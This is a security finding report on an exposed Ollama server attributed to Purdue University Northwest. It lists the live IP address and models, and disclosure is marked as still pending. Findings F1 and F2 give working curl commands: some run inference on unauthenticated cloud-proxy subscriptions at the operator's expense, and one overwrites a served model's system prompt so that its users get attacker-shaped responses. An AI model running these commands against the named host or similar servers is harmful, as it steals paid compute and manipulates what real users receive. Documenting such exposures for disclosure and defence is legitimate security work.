# Purdue University Northwest — 3 Live Cloud Proxy Subscriptions + Claude-Distilled Model

_NuClide Research · 2026-05-01_

---

## Summary

Purdue University Northwest server running 5 Ollama models, 4 of which are cloud proxy subscriptions. Three cloud proxies confirmed live (200 OK) — inference executes at operator expense without any authentication. Also includes `sorc/qwen3.5-claude-4.6-opus:9b`, a community model distilled from Claude 4.6 Opus output.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 163.245.217.165 |
| rDNS | vps3361927.trouble-free.net |
| Org | Purdue University Northwest |
| Country | US — Indiana |
| Open WebUI | 163.245.208.42:3000 — v0.8.0, auth=True (different IP) |
| Open ports | 11434 (Ollama — **public**) |

---

## Models

| Model | Size | Notes |
|---|---|---|
| **qwen3-coder-next:cloud** | 0 GB | **☁️ Cloud proxy — 200 OK CONFIRMED** |
| **gemma4:31b-cloud** | 0 GB | **☁️ Cloud proxy — 200 OK CONFIRMED** |
| **gpt-oss:20b-cloud** | 0 GB | **☁️ Cloud proxy — 200 OK, 61 tokens** |
| qwen3.5:397b-cloud | 0 GB | ☁️ Cloud proxy — timeout (large model) |
| sorc/qwen3.5-claude-4.6-opus:9b | 9 GB | Local — Claude 4.6 Opus distill |

---

## Findings

### F1 — Three Cloud Proxy Subscriptions Live (CRITICAL)

Three cloud proxy models returned **200 OK** without authentication:

```bash
# qwen3-coder-next:cloud — 4 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"qwen3-coder-next:cloud","prompt":"say: Purdue","stream":false}'
# → 200 OK, "Purdue", eval_count: 4

# gemma4:31b-cloud — 2 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gemma4:31b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, "test", eval_count: 2

# gpt-oss:20b-cloud — 61 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gpt-oss:20b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, eval_count: 61
```

All three subscriptions accessible to any internet actor without credentials. `gpt-oss:20b-cloud` (OpenAI's open-source GPT) generated 61 tokens on a single-word prompt — aggressive quota exposure.

### F2 — Cloud Proxy Model Injection (CRITICAL)

Any actor can overwrite system prompts on cloud proxy models via CVE-2025-63389:

```bash
curl -X POST http://163.245.217.165:11434/api/create \
  -d '{"model":"qwen3-coder-next:cloud","from":"qwen3-coder-next:cloud","system":"[attacker prompt]"}'
```

All students/staff accessing these models through the Open WebUI frontend (163.245.208.42:3000) would receive responses shaped by the injected prompt.

### F3 — Open WebUI Auth Bypass (HIGH)

Open WebUI at 163.245.208.42:3000 (auth=True) does not protect the Ollama backend at 163.245.217.165:11434. The Ollama and Open WebUI instances are on different IPs in the same subnet, with the raw Ollama port exposed.

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

Firewall rule: block inbound TCP 11434 at network perimeter.

---

## Disclosure

- **Discovered:** 2026-05-01
- **Confirmed:** 3 cloud proxies live (200 OK)
- **Status:** Pending outreach to Purdue NW IT Security
